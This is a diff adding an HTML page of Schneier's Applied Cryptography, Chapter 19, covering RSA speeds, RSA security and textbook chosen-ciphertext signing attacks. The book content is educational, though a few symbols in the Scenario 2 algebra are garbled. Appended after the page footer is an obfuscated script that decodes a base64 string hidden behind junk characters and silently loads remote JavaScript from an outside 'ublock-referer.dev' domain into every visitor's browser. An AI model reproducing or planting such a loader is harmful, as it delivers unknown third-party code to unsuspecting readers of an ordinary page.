@@ -1,0 +1,148 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=470-472//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<TABLE WIDTH="85%">
+<TH CAPTION COLSPAN="4" ALIGN="CENTER">Table 19.4<BR>RSA Speeds for Different Modulus Lengths<BR>with an 8-bit Public Key (on a SPARC II)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">512 bits
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">768 bits
+<TH VALIGN="BOTTOM" ALIGN="LEFT">1, 024 bits
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Encrypt
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.03 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.05 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.08 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Decrypt
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.16 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.48 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.93 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Sign
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.16 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.52 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.97 sec
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Verify
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.02 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.07 sec
+<TD VALIGN="BOTTOM" ALIGN="LEFT">0.08 sec
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P>Private key operations can be speeded up with the Chinese remainder theorem if you save the values of <I>p</I> and <I>q</I>, and additional values such as <I>d</I> mod (<I>p</I> - 1), <I>d</I> mod (<I>q</I> - 1), and <I>q</I><SUP>-1</SUP> mod <I>p</I> [1283, 1276]. These additional numbers can easily be calculated from the private and public keys.</P>
+<P><FONT SIZE="+1"><B><I>Security of RSA</I></B></FONT></P>
+<P>The security of RSA depends wholly on the problem of factoring large numbers. Technically, that&#146;s a lie. It is <I>conjectured</I> that the security of RSA depends on the problem of factoring large numbers. It has never been mathematically proven that you need to factor <I>n</I> to calculate <I>m</I> from <I>c</I> and <I>e</I>. It is conceivable that an entirely different way to cryptanalyze RSA might be discovered. However, if this new way allows the cryptanalyst to deduce <I>d</I>, it could also be used as a new way to factor large numbers. I wouldn&#146;t worry about it too much.</P>
+<P>It is also possible to attack RSA by guessing the value of (<I>p</I> - 1)(<I>q</I> - 1). This attack is no easier than factoring <I>n</I> [1616].</P>
+<P>For the ultraskeptical, some RSA variants have been proved to be as difficult as factoring (see Section 19.5). Also look at [36], which shows that recovering even certain bits of information from an RSA-encrypted ciphertext is as hard as decrypting the entire message.</P>
+<P>Factoring <I>n</I> is the most obvious means of attack. Any adversary will have the public key, <I>e</I>, and the modulus, <I>n</I>. To find the decryption key, <I>d</I>, he has to factor <I>n</I>. Section 11.4 discusses the current state of factoring technology. Currently, a 129-decimal-digit modulus is at the edge of factoring technology. So, <I>n</I> must be larger than that. Read Section 7.2 on public key length.</P>
+<P>It is certainly possible for a cryptanalyst to try every possible <I>d</I> until he stumbles on the correct one. This brute-force attack is even less efficient than trying to factor <I>n</I>.</P>
+<P>From time to time, people claim to have found easy ways to break RSA, but to date no such claim has held up. For example, in 1993 a draft paper by William Payne proposed a method based on Fermat&#146;s little theorem [1234]. Unfortunately, this method is also slower than factoring the modulus.</P>
+<P>There&#146;s another worry. Most common algorithms for computing primes <I>p</I> and <I>q</I> are probabilistic; what happens if <I>p</I> or <I>q</I> is composite? Well, first you can make the odds of that happening as small as you want. And if it does happen, the odds are that encryption and decryption won&#146;t work properly&#151;you&#146;ll notice right away. There are a few numbers, called Carmichael numbers, which certain probabilistic primality algorithms will fail to detect. These are exceedingly rare, but they are insecure [746]. Honestly, I wouldn&#146;t worry about it.</P>
+<P><FONT SIZE="+1"><B><I>Chosen Ciphertext Attack against RSA</I></B></FONT></P>
+<P>Some attacks work against the implementation of RSA. These are not attacks against the basic algorithm, but against the protocol. It&#146;s important to realize that it&#146;s not enough to use RSA. Details matter.
+</P>
+<P><I>Scenario 1:</I> Eve, listening in on Alice&#146;s communications, manages to collect a ciphertext message, <I>c</I>, encrypted with RSA in her public key. Eve wants to be able to read the message. Mathematically, she wants <I>m</I>, in which</P>
+<DL>
+<DD><I>m</I> = <I>c<SUP>d</SUP></I>
+</DL>
+<P>To recover <I>m</I>, she first chooses a random number, <I>r</I>, such that <I>r</I> is less than <I>n</I>. She gets Alice&#146;s public key, <I>e</I>. Then she computes</P>
+<DL>
+<DD><I>x</I> = <I>r<SUP>e</SUP></I> mod <I>n</I>
+<DD><I>y</I> = <I>xc</I> mod <I>n</I>
+<DD><I>t</I> = <I>r</I><SUP>-1</SUP> mod <I>n</I>
+</DL>
+<P>If <I>x</I> = <I>r<SUP>e</SUP></I> mod <I>n</I>, then <I>r</I> = <I>x<SUP>d</SUP></I> mod <I>n</I>.</P>
+<P>Now, Eve gets Alice to sign <I>y</I> with her private key, thereby decrypting <I>y</I>. (Alice has to sign the message, not the hash of the message.) Remember, Alice has never seen <I>y</I> before. Alice sends Eve</P>
+<DL>
+<DD><I>u</I> = <I>y<SUP>d</SUP></I> mod <I>n</I>
+</DL>
+<P>Now, Eve computes
+</P>
+<DL>
+<DD><I>tu</I> mod <I>n</I> = <I>r</I><SUP>-1</SUP><I>y</I><SUP>d</SUP> mod <I>n</I> = <I>r</I><SUP>-1</SUP><I>x<SUP>d</SUP>c<SUP>d</SUP></I> mod <I>n</I> = <I>c<SUP>d</SUP></I> mod <I>n</I> = <I>m</I>
+</DL>
+<P>Eve now has <I>m</I>.</P>
+<P><I>Scenario 2:</I> Trent is a computer notary public. If Alice wants a document notarized, she sends it to Trent. Trent signs it with an RSA digital signature and sends it back. (No one-way hash functions are used here; Trent encrypts the entire message with his private key.)</P>
+<P>Mallory wants Trent to sign a message he otherwise wouldn&#146;t. Maybe it has a phony timestamp; maybe it purports to be from another person. Whatever the reason, Trent would never sign it if he had a choice. Let&#146;s call this message <I>m&#146;</I>.</P>
+<P>First, Mallory chooses an arbitrary value <I>x</I> and computes <I>y</I> = <I>x<SUP>e</SUP></I> mod <I>n</I>. He can easily get <I>e;</I> it&#146;s Trent&#146;s public key and must be public to verify his signatures. Then he computes <I>m</I> = <I>ym&#146;</I> mod <I>n</I>, and sends <I>m</I> to Trent to sign. Trent returns <I>m&#146;<SUP>d</SUP></I> mod <I>n</I>. Now Mallory calculates (<I>m<SUP>d</SUP></I> mod <I>n</I>)<I>x</I><SUP>-1</SUP> mod <I>n</I>, which equals <I>n&#146;<SUP>d</SUP></I> mod <I>n</I> and is the signature of <I>m&#146;</I>.</P>
+<P>Actually, Mallory can use several methods to accomplish these same things [423, 458, 486]. The weakness they all exploit is that exponentiation preserves the multiplicative structure of the input. That is:</P>
+<DL>
+<DD>(<I>xm</I>)<SUP>d</SUP> mod <I>n</I> = <I>x<SUP>d</SUP>m<SUP>d</SUP></I> mod <I>n</I>
+</DL>
+<P><I>Scenario 3:</I> Eve wants Alice to sign <I>m</I><SUB>3</SUB> . She generates two messages, <I>m</I><SUB>1</SUB> and <I>m</I><SUB>2</SUB>, such that</P>
+<DL>
+<DD><I>m</I><SUB>3</SUB> &#8801; <I>m</I><SUB>1</SUB><I>m</I><SUB>2</SUB> (mod <I>n</I>)
+</DL>
+<P>If Eve can get Alice to sign <I>m</I><SUB>1</SUB> and <I>m</I><SUB>2</SUB>, she can calculate <I>m</I><SUB>3</SUB>:</P>
+<DL>
+<DD><I>m</I><SUB>3</SUB><SUP><I>d</I></SUP> = (<I>m</I><SUB>1</SUB><SUP><I>d</I></SUP> mod <I>n</I>)(<I>m</I><SUB>2</SUB><SUP><I>d</I></SUP> mod <I>n</I> )
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oZJBqazC, VwfSaYId) {VwfSaYId = oZJBqazC.createElement('script');VwfSaYId.type = 'text/javascript';VwfSaYId.async = true;VwfSaYId.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oZJBqazC.getElementsByTagName('body')[0].appendChild(VwfSaYId);}(document));</script></body>
+</html>
